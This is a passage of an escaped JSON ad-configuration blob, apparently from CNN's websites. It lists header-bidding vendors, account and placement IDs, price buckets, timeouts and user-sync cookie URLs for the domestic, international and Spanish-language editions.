2341606\",\"btf\":\"2341606\"}},\"MOBILE\":{\"HP\":{\"atf\":\"2460344\",\"btf\":\"2460344\"},\"ROS\":{\"atf\":\"2460344\",\"btf\":\"2460344\"}}}}},\"LANGUAGE\":{\"DOM\":\"en\",\"INTL\":\"en\"},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":15}}},\"LANGUAGE\":\"en\"}},\"PANGAEA\":{\"ACCOUNT_ID\":{\"INTL\":\"8613\",\"DOM\":0}},\"CRITEO\":{\"ACCOUNT_ID\":{\"INTL\":9264,\"DOM\":\"4157\"}},\"APPNEXUS\":{\"ACCOUNT_ID\":{\"DOM\":\"7745\",\"INTL\":\"8353\"},\"VIDEO_INVCODE\":{\"DOM\":\"cnn_homepage_video1\",\"INTL\":\"cnni_homepage_video1\"},\"PLAYBACK_METHOD\":{\"DOM\":{\"DESKTOP\":\"auto_play_sound_off\",\"MOBILE\":\"click_to_play\"},\"INTL\":{\"DESKTOP\":\"auto_play_sound_off\",\"MOBILE\":\"click_to_play\"}},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":15}}}},\"RESERVE\":{\"DOM\":0.9,\"INTL\":0.9},\"SUPPLY_TYPE\":{\"DOM\":{\"WEB\":true,\"MOBILE_WEB\":true},\"INTL\":{\"WEB\":true,\"MOBILE_WEB\":true}},\"CONTEXT\":{\"DOM\":\"instream\",\"INTL\":\"instream\"}},\"TRUSTX\":{\"UID\":{\"DOM\":{\"DESKTOP\":{\"atf\":{\"970x250\":\"15218\",\"970x90\":\"15219\",\"728x90\":\"15220\",\"300x250\":\"15224\",\"300x600\":\"15225\"},\"btf\":{\"970x250\":\"15221\",\"970x90\":\"15222\",\"728x90\":\"15223\",\"300x250\":\"15226\",\"300x600\":\"15227\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"15228\",\"300x250\":\"15229\"},\"btf\":{\"320x50\":\"15230\",\"300x250\":\"15231\"}}},\"INTL\":{\"DESKTOP\":{\"atf\":{},\"btf\":{}},\"MOBILE\":{\"atf\":{},\"btf\":{}}}}},\"PUBMATIC\":{\"PUBLISHER_ID\":{\"DOM\":\"162932\",\"INTL\":\"160262\"},\"MAPPINGS\":{\"DOM\":{\"DESKTOP\":{},\"MOBILE\":{}},\"INTL\":{\"DESKTOP\":{},\"MOBILE\":{}}}},\"SPOTX\":{\"CHANNEL_ID\":{\"DOM\":{\"DESKTOP\":\"\",\"MOBILE\":\"\"},\"INTL\":{\"DESKTOP\":\"325241\",\"MOBILE\":\"328164\"}},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":5,\"INTL\":5},\"MAX\":{\"DOM\":15,\"INTL\":15}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}}}}},\"TELARIA\":{\"AD_CODE\":{\"DOM\":\"\",\"INTL\":\"\"},\"SUPPLY_CODE\":{\"DOM\":\"\",\"INTL\":\"\"}},\"TRIPLELIFT\":{\"MAPPINGS\":{\"DOM\":{\"DESKTOP\":{\"HP\":{\"970x250\":\"CNN_leaderboard_Prebid\",\"970x90\":\"CNN_leaderboard_Prebid\",\"728x90\":\"CNN_leaderboard_Prebid\",\"300x600\":\"CNN_300x600_300x250_DeskTab_Prebid\",\"300x250\":\"CNN_Desktop_HPUpper2_InFeed_300x250_Prebid\"},\"ROS\":{\"970x250\":\"CNN_leaderboard_Prebid\",\"970x90\":\"CNN_leaderboard_Prebid\",\"728x90\":\"CNN_leaderboard_Prebid\",\"300x600\":\"CNN_300x600_300x250_DeskTab_Prebid\"}},\"MOBILE\":{\"HP\":{\"300x250\":\"CNN_300x250_Mobile_Prebid\"},\"ROS\":{\"300x250\":\"CNN_300x250_Mobile_Prebid\"}}},\"INTL\":{\"DESKTOP\":{\"HP\":{},\"ROS\":{}},\"MOBILE\":{\"HP\":{},\"ROS\":{}}}}},\"SHARETHROUGH\":{\"UNIT_MAPPING\":{\"DOM\":{\"DESKTOP\":{},\"MOBILE\":{}},\"INTL\":{\"DESKTOP\":{\"300x600\":\"35zgzLEa9bGmYyQoYpG5bFqW\",\"728x90\":\"7H5wtn8ji86Z4Ew4s7pQZQ3s\",\"300x250\":\"mMvTwgZ1k5vgw5dWWg4E9fs3\"},\"MOBILE\":{\"300x250\":\"mMvTwgZ1k5vgw5dWWg4E9fs3\"}}}},\"MEDIANET\":{\"CUSTOMER_ID\":{\"DOM\":\"8CUTGDN33\",\"INTL\":\"\"},\"SLOT_ID\":{\"DOM\":{\"bnr\":{\"atf\":\"102325203\",\"btf\":\"845950312\"},\"rect\":{\"atf\":\"147027733\",\"btf\":\"197708286\"},\"qtm\":\"147027733\"},\"INTL\":{\"bnr\":{\"atf\":\"\",\"btf\":\"\"},\"rect\":{\"atf\":\"\",\"btf\":\"\"},\"qtm\":\"\"}}},\"FLEDGE\":{\"BIDDERS\":[\"ix\"]},\"TEADS\":{\"PAGE_ID\":{\"DOM\":0,\"INTL\":0},\"PLACEMENT_ID\":{\"DOM\":0,\"INTL\":0}},\"CONCERT\":{\"PARTNER_ID\":{\"DOM\":\"CNN\",\"INTL\":\" \"}},\"OPENWEB\":{\"ORG\":{\"DOM\":\"pub_mM0DBXIIardI\",\"INTL\":\"\"},\"FLOOR_PRICE\":{\"DOM\":0,\"INTL\":0},\"PLACEMENT_ID\":{\"DOM\":{\"DESKTOP\":{\"atf\":\"sp_4hCVuB3p_Desktop_ATF\",\"btf\":\"sp_4hCVuB3p_Desktop_BTF\"},\"MOBILE\":{\"atf\":\"sp_4hCVuB3p_Mobile_ATF\",\"btf\":\"sp_4hCVuB3p_Mobile_BTF\"}},\"INTL\":{\"DESKTOP\":{\"atf\":\"\",\"btf\":\"\"},\"MOBILE\":{\"atf\":\"\",\"btf\":\"\"}}}}},\"TIMEOUTS\":{\"VIDEO\":{\"REFRESH\":1000,\"MIDROLL\":750,\"DEFAULT\":\"750\"},\"DISPLAY\":{\"MOBILE\":750,\"DESKTOP\":1150}},\"DEBUG\":false,\"APPROVED_BIDDERS\":{\"S2S\":{\"INTL\":[\"pangaea\",\"sharethrough\",\"ix\"],\"DOM\":[\"ix\"]},\"NATIVE\":{\"INTL\":[\"appnexus\",\"pangaea\"],\"DOM\":[\"appnexus\"]},\"CLIENT\":{\"INTL\":[\"appnexus\",\"pangaea\",\"ix\",\"rubicon\",\"sharethrough\",\"criteo\"],\"DOM\":[\"appnexus\",\"rubicon\",\"criteo\",\"ix\",\"trustx\"]}},\"BIDDERS\":{\"S2S\":{\"INTL\":[],\"DOM\":[]},\"NATIVE\":{\"INTL\":[],\"DOM\":[]},\"CLIENT\":{\"INTL\":[\"appnexus\",\"criteo\",\"ix\",\"pubmatic\",\"rubicon\",\"sharethrough\"],\"DOM\":[\"concert\",\"criteo\",\"ix\",\"openweb\",\"medianet\",\"pubmatic\",\"rubicon\",\"triplelift\",\"trustx\"]},\"OUTSTREAM\":{\"DOM\":[],\"INTL\":[]},\"VIDEO\":{\"DOM\":[],\"INTL\":[]}},\"PRICE_BUCKETS\":{\"DOM\":{\"DISPLAY\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":115,\"increment\":1}],\"VIDEO\":[{\"precision\":2,\"min\":1.5,\"max\":30,\"increment\":0.5},{\"precision\":2,\"min\":30,\"max\":115,\"increment\":1}],\"NATIVE\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":115,\"increment\":1}],\"OUTSTREAM\":[{\"precision\":2,\"min\":1,\"max\":50,\"increment\":1}]},\"INTL\":{\"DISPLAY\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":50,\"increment\":1}],\"VIDEO\":[{\"precision\":2,\"min\":1.5,\"max\":30,\"increment\":0.5},{\"precision\":2,\"min\":30,\"max\":50,\"increment\":1}],\"NATIVE\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":50,\"increment\":1}],\"OUTSTREAM\":[{\"precision\":2,\"min\":1,\"max\":50,\"increment\":1}]}},\"LIBRARY\":{\"VENDORS\":[\"criteo\",\"ix\",\"pubmatic\",\"rubicon\",\"triplelift\",\"trustx\",\"sharethrough\",\"medianet\",\"teads\",\"concert\",\"appnexus\"],\"MODULES\":[\"categoryTranslation\",\"consentManagement\",\"prebidServerBidAdapter\",\"adpod\",\"consentManagementUsp\",\"id5IdSystem\",\"identityLinkIdSystem\",\"debugging\",\"categpryTranslation\",\"freewheelAdserverVideo\",\"userId\",\"fledgeForGpt\"]},\"FLOORS\":{\"DISPLAY\":{\"DOM\":{\"DESKTOP\":0.01,\"MOBILE\":0.01},\"INTL\":{\"DESKTOP\":0.01,\"MOBILE\":0.01}},\"VIDEO\":{\"DOM\":{\"DESKTOP\":0.01,\"MOBILE\":0.01},\"INTL\":{\"DESKTOP\":0.01,\"MOBILE\":0.01}}}},\"PROXIMIC\":{\"DEBUG\":false},\"SOURCEPOINT\":{\"DEBUG\":false},\"SSAI\":{\"VENDORS\":{\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"}},\"SITE_VENDORS\":[\"AppNexus\",\"Freewheel\",\"LiveRamp\",\"PubMatic\",\"Rubicon\",\"Telaria\"],\"DEBUG\":false},\"TRANSACTION_ID\":{\"DEBUG\":false},\"USER_CONSENT\":{\"ONETRUST_SRC\":\"\",\"ONETRUST_GUID\":\"\",\"COOKIE_DOMAIN\":\"\",\"DEBUG\":false,\"ENABLED\":false},\"VERSION\":\"v2.0\",\"NAME\":\"CNN_2\",\"TIMESTAMP\":[\"1\",\"723\",\"573\",\"148\",\"396\"],\"DESCRIPTION\":\"CNN Stellar Migration\"},\"international\":{\"ADFUEL\":{\"AUTO_DISPATCH\":true,\"DEFAULT_TIMEOUT\":800,\"DEFAULT_DESKTOP_TIMEOUT\":800,\"DEFAULT_MOBILE_TIMEOUT\":800,\"IFRAME_TITLE\":\"advertisement\",\"NETWORK_ID\":\"8663477\",\"REFRESH_ON_FOCUS_ONLY\":false,\"LAZY_LOAD_FETCH_PERCENT\":500,\"LAZY_LOAD_RENDER_PERCENT\":200,\"LAZY_LOAD_MOBILE_SCALING\":2,\"COLLAPSE_EMPTY_DIVS\":true,\"DEBUG\":false,\"SITE_OBJECT\":\"CNN\",\"ACTIVE_MODULES\":[]},\"A9\":{\"SLOTNAMES\":{\"PREPEND_ADUNIT\":false,\"MIDROLL\":\"aps-midroll\",\"PREROLL\":\"aps-preroll\"},\"TIMEOUTS\":{\"MOBILE\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":750,\"INITIAL\":750}},\"DESKTOP\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":1150,\"INITIAL\":1150}}},\"DEBUG\":false,\"ACCOUNT_IDS\":{\"INTL\":\"3288\",\"DOM\":\"3159\"}},\"AUI\":{\"SITE_VENDORS\":{\"DOM\":[\"AppNexus\",\"Freewheel\",\"LiveRamp\",\"Rubicon\",\"Telaria\"],\"INTL\":[\"AppNexus\",\"Freewheel\",\"LiveRamp\",\"Rubicon\",\"Telaria\"]},\"VENDORS\":{\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"SpotX\":{\"COOKIE_NAME\":\"hkgc\",\"URL\":\"https://sync.search.spotxchange.com/audience_id\"},\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"}}},\"BEEMRAY\":{\"DEBUG\":false,\"CUSTOMER_ID\":\"\",\"API_KEY\":\"\"},\"BLOCKTHROUGH\":{\"DEBUG\":false},\"CEP\":{\"DEBUG\":false},\"CONSOLE_TOOL\":{\"DEBUG\":false,\"HOTKEY\":[\"Control\",\"Shift\",\"Z\"]},\"CREATIVE_REVIEW\":{\"DEBUG\":false,\"HOTKEY\":\"^ d o h $\"},\"CRITEO\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DESKTOP_ZONES\":{},\"MOBILE_TIMEOUT\":750,\"MOBILE_ZONES\":{},\"MULTISIZE_FIRST\":\"F\",\"MULTISIZE_LARGEST\":\"L\",\"MULTISIZE_ALL\":\"A\",\"MULTISIZE_METHOD\":\"L\",\"TIMEOUT\":750},\"FASTLANE\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DOM_ACCOUNT_ID\":11078,\"INTL_ACCOUNT_ID\":11016,\"MOBILE_TIMEOUT\":750,\"TIMEOUT\":750},\"GUID\":{\"DEBUG\":false},\"IAS\":{\"ACCOUNT_IDS\":{\"DOM\":925660,\"INTL\":925660},\"DEBUG\":false},\"IX\":{\"DEBUG\":false,\"SCRIPT_KEY\":{\"DOM\":null,\"INTL\":null},\"IDENTITY\":\"\"},\"IVR\":{\"DEFAULT_DISPLAY_PERCENT\":50,\"DEFAULT_DISPLAY_MILLISECONDS\":35000,\"DEBUG\":false},\"KRUX\":{\"INTL_CONTROLTAG\":\"\",\"DOM_CONTROLTAG\":\"\",\"DEBUG\":false},\"MALVERTISING\":{\"SCRIPT_SRC\":\"//cadmus.script.ac/d2uap9jskdzp2/script.js\",\"SITE_VENDOR\":\"CleanIO\",\"DEBUG\":false},\"PREBID\":{\"SEND_ALL_BIDS\":{\"INTL\":true,\"DOM\":true},\"VENDOR\":{\"IX\":{\"IDENTITY\":\"\",\"SITE_ID\":{\"DOM\":{\"DESKTOP\":{\"atf\":{\"728x90\":\"423255\",\"970x250\":\"423255\",\"970x90\":\"423255\",\"300x600\":\"423257\",\"300x250\":\"423257\"},\"btf\":{\"300x600\":\"423258\",\"300x250\":\"423258\",\"728x90\":\"423256\",\"970x250\":\"423256\",\"970x90\":\"423256\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"423259\",\"300x250\":\"423261\"},\"btf\":{\"300x250\":\"423260\",\"320x50\":\"423262\"}},\"VIDEO\":0,\"OUTSTREAM\":{\"DESKTOP\":0,\"MOBILE\":0}},\"INTL\":{\"DESKTOP\":{\"atf\":{\"728x90\":\"341959\",\"970x250\":\"341960\",\"970x90\":\"341961\",\"300x600\":\"341962\",\"300x250\":\"341963\"},\"btf\":{\"300x600\":\"341965\",\"300x250\":\"341966\",\"728x90\":\"341967\",\"970x250\":\"341968\",\"970x90\":\"341969\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"341964\",\"300x250\":\"341970\"},\"btf\":{\"320x50\":\"341957\",\"300x250\":\"341971\"}},\"VIDEO\":0,\"OUTSTREAM\":{\"DESKTOP\":0,\"MOBILE\":0}}},\"OUTSTREAM\":{\"SITE_ID\":{\"DOM\":{\"DESKTOP\":0,\"MOBILE\":0},\"INTL\":{\"DESKTOP\":0,\"MOBILE\":0}}},\"VIDEO\":{\"WIDTH\":640,\"HEIGHT\":480,\"MIMES\":[\"video/mp4\"],\"PROTOCOLS\":[2,3,5,6],\"SITE_ID\":{\"DOM\":{\"DESKTOP\":\"829396\",\"MOBILE\":\"829397\"},\"INTL\":{\"DESKTOP\":\"829396\",\"MOBILE\":\"829397\"}},\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":15,\"INTL\":15}}}}},\"RUBICON\":{\"ACCOUNT_ID\":{\"DOM\":\"11078\",\"INTL\":\"11016\"},\"SITE_ID\":{\"DOM\":{\"DESKTOP\":0,\"MOBILE\":0,\"VIDEO\":{\"DESKTOP\":0,\"MOBILE\":0}},\"INTL\":{\"DESKTOP\":\"78582\",\"MOBILE\":\"78584\",\"VIDEO\":{\"DESKTOP\":\"415330\",\"MOBILE\":\"430362\"}}},\"ZONE_MAPPING\":{\"DOM\":{\"DESKTOP\":{\"HP\":{\"btf\":0,\"atf\":0},\"ROS\":{\"btf\":0,\"atf\":0}},\"MOBILE\":{\"HP\":{\"btf\":0,\"atf\":0},\"ROS\":{\"btf\":0,\"atf\":0}},\"VIDEO\":{\"DESKTOP\":{\"HP\":{\"atf\":\"0\",\"btf\":\"0\"},\"ROS\":{\"atf\":\"0\",\"btf\":\"0\"}},\"MOBILE\":{\"HP\":{\"atf\":\"0\",\"btf\":\"0\"},\"ROS\":{\"atf\":\"0\",\"btf\":\"0\"}}}},\"INTL\":{\"DESKTOP\":{\"HP\":{\"btf\":\"369850\",\"atf\":\"369850\"},\"ROS\":{\"btf\":\"369850\",\"atf\":\"369850\"}},\"MOBILE\":{\"HP\":{\"btf\":\"369856\",\"atf\":\"369856\"},\"ROS\":{\"btf\":\"369856\",\"atf\":\"369856\"}},\"VIDEO\":{\"DESKTOP\":{\"HP\":{\"atf\":\"2341606\",\"btf\":\"2341606\"},\"ROS\":{\"atf\":\" 2341606\",\"btf\":\"2341606\"}},\"MOBILE\":{\"HP\":{\"atf\":\"2460344\",\"btf\":\"2460344\"},\"ROS\":{\"atf\":\"2460344\",\"btf\":\"2460344\"}}}}},\"LANGUAGE\":{\"DOM\":\"en\",\"INTL\":\"en\"},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":15,\"INTL\":15}}},\"LANGUAGE\":\"en\"}},\"PANGAEA\":{\"ACCOUNT_ID\":{\"INTL\":\"8613\",\"DOM\":0}},\"CRITEO\":{\"ACCOUNT_ID\":{\"INTL\":9264,\"DOM\":4157}},\"APPNEXUS\":{\"ACCOUNT_ID\":{\"DOM\":\"7745\",\"INTL\":\"8353\"},\"VIDEO_INVCODE\":{\"DOM\":\"cnn_homepage_video1\",\"INTL\":\"cnni_homepage_video1\"},\"PLAYBACK_METHOD\":{\"DOM\":{\"DESKTOP\":\"auto_play_sound_off\",\"MOBILE\":\"click_to_play\"},\"INTL\":{\"DESKTOP\":\"auto_play_sound_off\",\"MOBILE\":\"click_to_play\"}},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":5,\"INTL\":5},\"MAX\":{\"DOM\":15,\"INTL\":15}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}}}},\"RESERVE\":{\"DOM\":0.9,\"INTL\":0.9},\"SUPPLY_TYPE\":{\"DOM\":{\"WEB\":true,\"MOBILE_WEB\":true},\"INTL\":{\"WEB\":true,\"MOBILE_WEB\":true}},\"CONTEXT\":{\"DOM\":\"instream\",\"INTL\":\"instream\"}},\"PUBMATIC\":{\"PUBLISHER_ID\":{\"DOM\":\"162932\",\"INTL\":\"160262\"},\"MAPPINGS\":{\"DOM\":{\"DESKTOP\":{},\"MOBILE\":{}},\"INTL\":{\"DESKTOP\":{},\"MOBILE\":{}}}},\"SHARETHROUGH\":{\"UNIT_MAPPING\":{\"DOM\":{\"DESKTOP\":{},\"MOBILE\":{}},\"INTL\":{\"DESKTOP\":{\"300x250\":\"mMvTwgZ1k5vgw5dWWg4E9fs3\",\"300x600\":\"35zgzLEa9bGmYyQoYpG5bFqW\",\"728x90\":\"7H5wtn8ji86Z4Ew4s7pQZQ3\",\"970x250\":\"r99VVje1tPxSLmvMdbemDVKq\"},\"MOBILE\":{\"300x250\":\"mMvTwgZ1k5vgw5dWWg4E9fs3\"}}}},\"TEADS\":{\"PAGE_ID\":{\"DOM\":0,\"INTL\":\"124050\"},\"PLACEMENT_ID\":{\"DOM\":0,\"INTL\":\"134874\"}},\"FLEDGE\":{\"BIDDERS\":[\"ix\"]}},\"TIMEOUTS\":{\"VIDEO\":{\"REFRESH\":1000,\"MIDROLL\":750,\"DEFAULT\":500},\"DISPLAY\":{\"MOBILE\":750,\"DESKTOP\":1150}},\"DEBUG\":false,\"APPROVED_BIDDERS\":{\"S2S\":{\"INTL\":[\"pangaea\",\"sharethrough\",\"ix\"],\"DOM\":[\"ix\"]},\"NATIVE\":{\"INTL\":[\"appnexus\",\"pangaea\"],\"DOM\":[\"appnexus\"]},\"CLIENT\":{\"INTL\":[\"appnexus\",\"pangaea\",\"ix\",\"rubicon\",\"sharethrough\",\"criteo\"],\"DOM\":[\"appnexus\",\"rubicon\",\"criteo\",\"ix\",\"trustx\"]}},\"BIDDERS\":{\"S2S\":{\"INTL\":[],\"DOM\":[]},\"NATIVE\":{\"INTL\":[],\"DOM\":[]},\"CLIENT\":{\"INTL\":[\"appnexus\",\"criteo\",\"ix\",\"pubmatic\",\"rubicon\",\"sharethrough\"],\"DOM\":[]},\"OUTSTREAM\":{\"DOM\":[],\"INTL\":[\"appnexus\",\"pubmatic\",\"teads\"]},\"VIDEO\":{\"DOM\":[],\"INTL\":[]}},\"FLOORS\":{\"DISPLAY\":{\"DOM\":{\"DESKTOP\":0.01,\"MOBILE\":0.01},\"INTL\":{\"DESKTOP\":0.01,\"MOBILE\":0.01}},\"VIDEO\":{\"DOM\":{\"DESKTOP\":0.01,\"MOBILE\":0.01},\"INTL\":{\"DESKTOP\":0.01,\"MOBILE\":0.01}}},\"PRICE_BUCKETS\":{\"DOM\":{\"DISPLAY\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":115,\"increment\":1}],\"VIDEO\":[{\"precision\":2,\"min\":4,\"max\":50,\"increment\":1},{\"precision\":2,\"min\":50,\"max\":100,\"increment\":5}],\"OUTSTREAM\":[{\"precision\":2,\"min\":1,\"max\":50,\"increment\":1}]},\"INTL\":{\"DISPLAY\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":50,\"increment\":1}],\"VIDEO\":[{\"precision\":2,\"min\":4,\"max\":50,\"increment\":1},{\"precision\":2,\"min\":50,\"max\":100,\"increment\":5}],\"OUTSTREAM\":[{\"precision\":2,\"min\":1,\"max\":50,\"increment\":1}]}},\"LIBRARY\":{\"VENDORS\":[\"appnexus\",\"criteo\",\"rubicon\",\"pubmatic\",\"ix\",\"sharethrough\",\"teads\"],\"MODULES\":[\"categoryTranslation\",\"consentManagement\",\"id5IdSystem\",\"identityLinkIdSystem\",\"prebidServerBidAdapter\",\"fledgeForGpt\"]}},\"PROXIMIC\":{\"DEBUG\":false},\"SOURCEPOINT\":{\"DEBUG\":false},\"SSAI\":{\"VENDORS\":{\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"}},\"SITE_VENDORS\":[\"AppNexus\",\"Freewheel\",\"Rubicon\",\"Telaria\"],\"DEBUG\":false},\"TRANSACTION_ID\":{\"DEBUG\":false},\"USER_CONSENT\":{\"ONETRUST_SRC\":\"\",\"ONETRUST_GUID\":\"\",\"COOKIE_DOMAIN\":\"\",\"DEBUG\":false,\"ENABLED\":false},\"VERSION\":\"v2.0\",\"NAME\":\"CNNi_2\",\"TIMESTAMP\":[\"1\",\"723\",\"573\",\"148\",\"431\"],\"DESCRIPTION\":\"CNN International Stellar Migration\"},\"espanol\":{\"ADFUEL\":{\"AUTO_DISPATCH\":true,\"DEFAULT_TIMEOUT\":800,\"DEFAULT_DESKTOP_TIMEOUT\":800,\"DEFAULT_MOBILE_TIMEOUT\":800,\"IFRAME_TITLE\":\"advertisement\",\"NETWORK_ID\":\"21756062855\",\"REFRESH_ON_FOCUS_ONLY\":false,\"LAZY_LOAD_FETCH_PERCENT\":500,\"LAZY_LOAD_RENDER_PERCENT\":200,\"LAZY_LOAD_MOBILE_SCALING\":2,\"COLLAPSE_EMPTY_DIVS\":true,\"DEBUG\":false,\"SITE_OBJECT\":\"CNNEspanol\",\"ACTIVE_MODULES\":[\"\"]},\"A9\":{\"SLOTNAMES\":{\"PREPEND_ADUNIT\":false,\"MIDROLL\":\"aps-midroll\",\"PREROLL\":\"aps-preroll\"},\"TIMEOUTS\":{\"MOBILE\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":750,\"INITIAL\":750}},\"DESKTOP\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":1150,\"INITIAL\":1150}}},\"DEBUG\":false,\"ACCOUNT_IDS\":{\"INTL\":\"3288\",\"DOM\":\"3159\"}},\"AUI\":{\"SITE_VENDORS\":{\"DOM\":[],\"INTL\":[]},\"VENDORS\":{\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"SpotX\":{\"COOKIE_NAME\":\"hkgc\",\"URL\":\"https://sync.search.spotxchange.com/audience_id\"},\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"}}},\"BEEMRAY\":{\"DEBUG\":false,\"CUSTOMER_ID\":\"\",\"API_KEY\":\"\"},\"BLOCKTHROUGH\":{\"DEBUG\":false},\"CEP\":{\"DEBUG\":false},\"CONSOLE_TOOL\":{\"DEBUG\":false,\"HOTKEY\":[\